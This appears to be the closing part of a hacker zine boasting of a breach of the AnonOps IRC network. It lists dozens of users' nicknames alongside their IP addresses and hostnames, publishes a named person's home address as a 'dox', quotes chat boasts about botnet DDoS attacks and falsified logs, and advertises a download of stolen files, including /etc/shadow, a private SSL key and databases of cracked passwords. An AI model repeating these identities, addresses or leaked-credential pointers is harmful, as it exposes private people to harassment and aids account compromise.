+koolz 98.203.26.25 c-98-203-26-25.hsd1.fl.comcast.net
+lionymous 67.183.152.14 c-67-183-152-14.hsd1.wa.comcast.net
+locky 186.86.129.1 Dynamic-IP-186861291.cable.net.co
+loginix 70.170.36.125 ip70-170-36-125.lv.lv.cox.net
+madmaster 77.247.181.162 chomsky.torservers.net
+manonn 76.113.235.189 c-76-113-235-189.hsd1.mn.comcast.net
+mepup 85.24.189.121 h-189-121.a189.priv.bahnhof.se
+naSignal 193.138.216.101 tor-proxy.vm.31173.se
+nibble 128.32.21.89 static-128-32-21-89.Law.Berkeley.EDU
+nikkofritz 109.215.173.29 APoitiers-257-1-142-29.w109-215.abo.wanadoo.fr
+nononn 46.239.119.58 host095577.olf.sgsnet.se
+nr206 80.237.226.74 tor4.anonymizer.ccc.de 193.177.160.99 static.ip-193-177-160-099.signet.nl
+opmonsanto 93.182.133.20 anon-133-20.vpn.ipredator.se
+pagaro_verde12 189.227.250.160 dsl-189-227-250-160-dyn.prod-infinitum.com.mx
+ph33r 68.170.73.247 247.73.170.68.belairinternet.com
+phusion 76.21.16.54 c-76-21-16-54.hsd1.ca.comcast.net
+qwerty 173.3.247.208 ool-ad03f7d0.dyn.optonline.net
+risk 202.59.80.158
+savetheinternet 58.175.28.253 CPE-58-175-28-253.mqdl1.lon.bigpond.net.au
+sd 0.0.7.209
+sdk 201.82.181.124 c952b57c.virtua.com.br
+sike333 189.178.67.80 dsl-189-178-67-80-dyn.prod-infinitum.com.mx
+soldout 71.189.172.143 pool-71-189-172-143.lsanca.fios.verizon.net
+sprinkles 213.46.138.76 d138076.upc-d.chello.nl
+subz3r0e 41.202.225.156
+triPPy 173.245.64.183 173.245.64.160
+tweak_ 142.163.144.229 mtprnf0110w-142163144229.pppoe-dynamic.High-Speed.nl.bellaliant.net
+u_raff_u_roose 68.43.10.243 c-68-43-10-243.hsd1.mi.comcast.net
+uuuuffffffff 213.163.64.43 nl.gigabit.perfect-privacy.com
+veritas 0.0.7.209
+workbench 50.71.143.81
+wtfCALEB 128.32.21.89 static-128-32-21-89.Law.Berkeley.EDU
+wtf_chuck 71.57.241.72 c-71-57-241-72.hsd1.pa.comcast.net
+xent 77.247.181.162 chomsky.torservers.net
+zombie 93.94.245.152 93-94-245-152.dynamic.swissvpn.net
+zomfg 77.111.42.10 77-111-42-10.ipv4.tusmobil.si
+zorro17 187.134.17.57 dsl-187-134-17-57-dyn.prod-infinitum.com.mx
+zxcvsd 95.140.125.37 free-125-37.mediaworksit.net
+
+                    
+                   :: 0x06 ~ l0l sh1t ::
+
+Here's a bit of quotes we found funny.
+                            
+        _       _                       _                            
+       | |     | |                     (_)                           
+     __| | __ _| |__   ___   ___   __ _ _  ___ _ __ ___   __ _ _ __  
+    / _` |/ _` | '_ \ / _ \ / _ \ / _` | |/ _ \ '_ ` _ \ / _` | '_ \ 
+   | (_| | (_| | |_) | (_) | (_) | (_| | |  __/ | | | | | (_| | | | |
+    \__,_|\__,_|_.__/ \___/ \___/ \__, |_|\___|_| |_| |_|\__,_|_| |_|
+                                   __/ |                             
+                                  |___/                              
+                                                   
+<daboogieman> now that i'm an oper im no longer accepting PM's from anyone
+    because i feel that i have too much else to do ( being an oper and all)
+<daboogieman> the only thing i know about irc is how to sajoin <nick> #kill
+    and /kill <nick>
+<daboogieman> any attempt by a non-oper to chat to me will be met by instand
+    gline and/or kill   
+        _      
+       (_)     
+  _ __  _  ___ 
+ | '_ \| |/ _ \
+ | |_) | |  __/
+ | .__/|_|\___|
+ | |           
+ |_|           
+
+
+<pie>!ban *!* () *
+<anon>what the fuck
+<pie>its ok i can do whatever i want because im drunk
+<pie>it will be fine in the morning
+                           
+               _      _     
+              | |    | |    
+      ___ __ _| | ___| |__  
+     / __/ _` | |/ _ \ '_ \ 
+    | (_| (_| | |  __/ |_) |
+     \___\__,_|_|\___|_.__/ 
+                        
+                        
+<Caleb>fuck my vps just got hacked with a ddos attack
+<Caleb>morning
+<Caleb>hi
+<Caleb>:3
+<Caleb>have a nice sleep? :3
+<Caleb>i had a good sleep
+<Caleb>eating my lunch now
+<Caleb>ohai
+<Caleb>ohai!
+<Caleb>ohai :3
+<Caleb>my computer seems to be fucking itself at 7000 rpms.
+<Caleb> just block the morons
+<Caleb>hmmm
+<Caleb>lol 
+<Caleb>sup!
+<Caleb>:3
+<Caleb>going to sleep for a bit bbl...
+<Caleb>How do you hack with a DDOS attack? 
+<Caleb>my shell just got hit with 77gbps
+<Caleb>im gonna destroy them when i find out who did it
+<Caleb>just get a VPS/VPN and use IRSSI to stop yourself getting ddosed
+
+@CalebNewz: somehow their hitting my ip table.
+    _____      _____ _ __  
+   / _ \ \ /\ / / _ \ '_ \ 
+  | (_) \ V  V /  __/ | | |
+   \___/ \_/\_/ \___|_| |_|
+                           
+                                                 
+<owen>FUCK this box doesnt have wget we are screwed then
+<owen>[redacted] im fucking zlineing you because you're a movement traitor
+<owen>you dont even know who i really am and the connections i have
+<owen>i can just call in a favor and get your personal life ruined
+<owen>is there young boys here (over 18) who wanna have a chat in pm??
+<owen>you HAVE to install unreal to ~/Unreal3.2
+
+            _           _____     __
+      /\   | |         |__ \ \   / /
+     /  \  | |__   __ _   ) \ \_/ / 
+    / /\ \ | '_ \ / _` | / / \   /  
+   / ____ \| | | | (_| |/ /_  | |   
+  /_/    \_\_| |_|\__,_|____| |_|   
+                                    
+                                  
+<Aha2Y>if your servers getting DDoSed just mitigate the attack
+<Aha2Y>i have this awesome script i found on hackforums
+<Aha2Y>it blocks ip addresses
+<Aha2Y>i found a backdoored zalgo source on the internet and im gonna use
+    it on my network
+<Aha2Y>what the fuck i am getting ddosed cos i just saw this ip in my netstat
+    so that means its DDoSing me right?
+<Aha2Y>i'll use my script of hackforums to block it
+
+    ____                       ____     _    _ _ 
+   |  _ \ _____      _____ _ _|___ \   / \  | | |
+   | |_) / _ \ \ /\ / / _ \ '__|__) | / _ \ | | |
+   |  __/ (_) \ V  V /  __/ |  / __/ / ___ \| | |
+   |_|   \___/ \_/\_/ \___|_| |_____/_/   \_\_|_|
+                                              
+@Power2All: For the people who used CGI:IRC, my sincerely excuses for the IP
+    leak. I couldn't fix it in time as Nikon or Chippy DDoS't my home IP too.
+    
+@Power2All: @doxbin Oh and, I never said back when I put CGI:IRC up, that it
+    is deemed SAFE. I said it was online, not "SAFE", dipshit.
+@doxbin: @Power2All Why would you even bother advertising it if it wasn't safe?
+    That just smacks of gross negligence. Turn in your Guy Fawkes mask.
+    
+@Power2All: @anonymouSabu They are all Nullrouted sofar, and some suspended by
+    the provider.
+    
+@Power2All: Yes, they honeypotted my IP. Using mobile connection now.
+
+                            _                 
+     _ __ ___ _ __ ___  ___| | ___  ___ _ __  
+    | '__/ _ \ '_ ` _ \/ __| |/ _ \/ _ \ '_ \ 
+    | | |  __/ | | | | \__ \ |  __/  __/ |_) |
+    |_|  \___|_| |_| |_|___/_|\___|\___| .__/ 
+                                       |_|
+
+D0X TIME :: D0X TIME :: D0X TIME :: D0X TIME :: D0X TIME :: D0X TIME :: D0X TIME
+    Names:          Rick Bonata
+                    
+    Address         221 FRANKLIN AVE
+                    CUYAHOGA FALLS, OH 44221
+                    
+
+<remsleep>i might launch at 666,666
+<remsleep>idk yet
+<remsleep>i've done small tests, like basically, i can take down BoA's website in minutes.
+<remsleep>it takes time to send orders to 180,000 zombies :p
+<remsleep>the time servers being down complicated the scanrio
+<remsleep>scenario                             
+<remsleep>once i hit 1,000,000 i will take out the .mil tld servers an main dns.
+
+<Ian>on average, the typical non-root server is 10mbps
+<remsleep>but as far as the world is concerned, i am just a host.
+<remsleep>Ian: yes
+<remsleep>Ian: I go after school districts, fortune 500's, car dealerships, etc.
+<Ian>so you are talking about
+<Ian>10,000,000mbps
+<remsleep>:)
+<Ian>10,000gbps
+<remsleep>heuheheuhehehe
+<Ian>10 terabits
+<remsleep>roughly.
+<remsleep>plus or minus
+<remsleep>it's take years
+<remsleep>and constant evasion of law enforcement
+<remsleep>i've got a direct line into NCIC via telnet.
+<remsleep>:D :D :D
+
+<remsleep>verified i have gov ip's on mah shit
+<remsleep>i am going to block ALL government ips
+<remsleep>http://www.uaff.info/militarytracking.htm
+<remsleep>fyi
+
+<remsleep>i mean if i was a giant corporate vpn provider and they offered me like
+    2 mill for some ips, i would give fake ips but i would do it for the $$ lol
+<remsleep>not the first time i've falsified logs for money ;p
+<remsleep>i remember in 09 when i cleared all the cached ips / logs for Verizon
+    DHCP clients, I was getting radio signals beemed at my house :P
+<remsleep>@-@
+<remsleep>wonder how many warrants become invalid because of that little job :D
+<remsleep>chinanet is connected to me
+<remsleep>mother fuckers
+
+<remsleep> If the FBI does come, or whomever for whatever reason, I will have
+    them on camera with a live feed with a 3G modem backup streaming to one of
+    my VDSs. I would be unstopable after that, I would sue for false arrest,
+    kidnapping, conspiracy to each, general fuckery as well as a large sum of
+    punitive damages.
+
+<anon> Hey
+<anon> 221 FRANKLIN AVE
+<anon> CUYAHOGA FALLS, OH 4422
+<anon> Lucky for you, I'm not in your jurisdiction ;)
+<remsleep> So you're saying you're a cop?
+<remsleep> And btw, that's just one of my many residential IPs in Cuyahoga
+    Falls Ohio
+<remsleep> and my dns whois, falsified as well. :\
+<anon> Yeah, ok
+<anon> You should probably just /quit
+<anon> If you continue to enable terrorist activity, I'll call someone who
+    DOES have jurisdiction
+<remsleep> ..
+<remsleep> Really?
+<anon> Really.
+<remsleep> Dude, call who you wanna call. I could care less. 
+<anon> Also, seriously?
+<anon> 21:45:27 [basedonconfusion] -Global(services () basedonconfusion co)-
+    [remsleep] Memo to ANY Law Enforcement: You are compelled to
+    leave this network, failure to do so will result in whatever
+    evidence obtained being after this point will become sealed
+    and unusable in court. You are tresspasing, you have been warned.
+<anon> HAHAHAHAHA
+<anon> I've kicked down the doors of file sharers who had similar
+    notices attached to their servers
+
+                        :: 0x07 ~ FiL3z ::
+
+We've enclosed some fun files for your viewing pleasure. These are probably
+the best part of this dump.
+
+Filename            Description
+shadow              /etc/shadow, self explanatory
+oper.db             Anope Oper Database
+chan.db             Anope Channel Database
+nick.db             Anope NickServ Database
+keys.txt            AnonOps private ssl key/cert
+defaults.conf       InspIRCd Conf.
+nick.out.txt        Human readable NickServ database w/ cracked passwords,
+                    nickname aliases, registration times, seen times, memos (LOL)
+chan.out.txt        Huamn readable ChanServ database w/ cracked passwords,
+                    access lists, akick lists, badwords, ..etc.
+
+http://wikisend.com/download/854132/rls.zip
+                    
+                        :: 0x08 ~ exit ::
+                        
+tl;dr JAJA ANONOPS ESTAN MUERTO.   (LOL DEAD)                     
+
+AnonOps killed Anonymous, and today, we at HEP have avenged them. We cannot
+bring Anonymous back to the state it was, but we've burned the abonimation
+that took its place to the ground. For that, we are proud. We hope you enjoyed
+reading this little 'zine half as much as we enjoyed owning these
+pseudo-activitists for the Nth time. We've personally been responsible for
+nulling somewhere in the neighborhood of 50 of their servers, and will just
+keep dropping them as they put more back up. Ryan Cleary had the right idea,
+in trying to get Anons to spread out, but the namefags didn't want to listen.
+This time, we can only hope that they do.
+
+VIVA LA CARLOS1337!!!!!
+
+shoutz 2 kayla, robert cavanaugh, topiary & ryan cleary and zalgo irc trojan
+    for fighting the good fight.
+
+E0F
